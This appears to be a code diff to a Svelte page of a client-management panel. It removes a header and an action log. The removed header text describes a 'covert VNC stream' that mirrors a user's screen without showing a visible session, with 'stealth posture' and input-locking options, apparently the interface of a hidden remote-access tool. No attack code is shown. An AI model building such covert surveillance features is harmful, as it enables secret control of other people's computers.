@@ -16,8 +16,6 @@
                 CardHeader,
                 CardTitle
         } from '$lib/components/ui/card/index.js';
-        import ClientWorkspaceHero from '$lib/components/workspace/workspace-hero.svelte';
-        import ActionLog from '$lib/components/workspace/action-log.svelte';
         import { getClientTool } from '$lib/data/client-tools';
         import type { Client } from '$lib/data/clients';
         import { appendWorkspaceLog, createWorkspaceLogEntry } from '$lib/workspace/utils';
@@ -55,27 +53,6 @@
 </script>
 
 <div class="space-y-6">
-        <ClientWorkspaceHero
-                {client}
-                {tool}
-                metadata={[
-                        {
-                                label: 'Stealth posture',
-                                value: blockLocalInput ? 'Exclusive control' : 'Shadow control',
-                                hint: 'Adjust input locking once the agent begins streaming frames.'
-                        },
-                        {
-                                label: 'Clipboard sync',
-                                value: clipboardSync ? 'Enabled' : 'Disabled'
-                        }
-                ]}
-        >
-                <p>
-                        Coordinate a covert VNC stream that mirrors display updates without surfacing a visible session to the
-                        user. The current prototype focuses on session planning, QoS shaping, and guardrail design.
-                </p>
-        </ClientWorkspaceHero>
-
         <Card>
                 <CardHeader>
                         <CardTitle class="text-base">Session parameters</CardTitle>
@@ -171,6 +148,4 @@
                         </ul>
                 </CardContent>
         </Card>
-
-        <ActionLog entries={log} />
 </div>
